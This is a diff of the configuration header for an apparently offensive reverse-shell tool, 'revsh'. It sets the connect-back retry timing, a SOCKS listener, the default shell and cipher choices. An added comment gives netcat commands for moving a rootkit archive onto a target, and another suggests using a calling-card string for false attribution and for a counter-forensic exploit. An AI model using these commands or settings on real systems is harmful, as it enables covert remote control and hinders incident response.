@@ -12,17 +12,26 @@
 /*  Default socks proxy listener port */
 #define	SOCKS_LISTENER	"2280"
 
+/* Default point-to-point local proxy. */
+/*
+		This is useful for file transfers.
+		Example:
+			On target:  nc -l 127.0.0.1 -p 2291 >rootkit.tar
+			On control: cat rootkit.tar | nc 127.0.0.1 2290
+ */
+#define LOCAL_LISTENER	"2290:127.0.0.1:2291"
+
 /*  Default shell. */
 #define DEFAULT_SHELL	"/bin/bash"
 
-/*  These two environement variables are important enough for allowing the tool to provide a sane */
+/*  These two environment variables are important enough for allowing the tool to provide a sane */
 /*  feeling terminal that we go ahead and export them automatically. Feel free to bake more in here */
 /*  by adding them to this DEFAULT_ENV string (space delimited). Otherwise, just set the environment */
 /*  on the fly using your rc file. */
 #define DEFAULT_ENV	"TERM LANG"
 
 /*  Default retry range, in seconds. */ 
-/*  E.g. "600,1200" sets recurrance of connect back retry to some random time between 5 and 20 min. */
+/*  E.g. "600,1200" sets recurrence of connect back retry to some random time between 5 and 20 min. */
 #define RETRY "600,1200"
 
 /*  Time to wait on a new connection before dying, in seconds. */
@@ -32,7 +41,6 @@
 #define REVSH_DIR "~/.revsh/"
 #define RC_FILE	REVSH_DIR "rc"
 #define KEYS_DIR REVSH_DIR "keys/"
-//#define	TTYSCRIPTS_DIR REVSH_DIR "ttyscripts/"
 
 /*  Cipher definitions. */
 #define ADH_CIPHER "ADH-AES256-SHA"
@@ -51,14 +59,10 @@
 #define CALLING_CARD "@emptymonkey - https://github.com/emptymonkey"
 
 /*
-	CALLING_CARD may also be useful as a mechanism for:
-		-  false attribution.
-		-  embedding a counter-forensic exploit (CVE-2014-8485).
-
-	 The CALLING_CARD attribution feature is intended as a cynical commentary on the current state of APT attribution.
-	 If your methodology for attribution doesn't at a minimum rely upon fingerprinting the operator through an
-	 analysis of their personal system interaction idioms and forensic artifacts then please re-roll your cyber-identity.
+	 CALLING_CARD may also be useful as a mechanism for:
+	 -  false attribution.
+	 -  embedding a counter-forensic exploit (CVE-2014-8485).
 
 	 /usr/bin/strings is *not* a cyber-attribution tool. 
-*/
+ */
 //#define CALLING_CARD "白人害怕中国文字！"
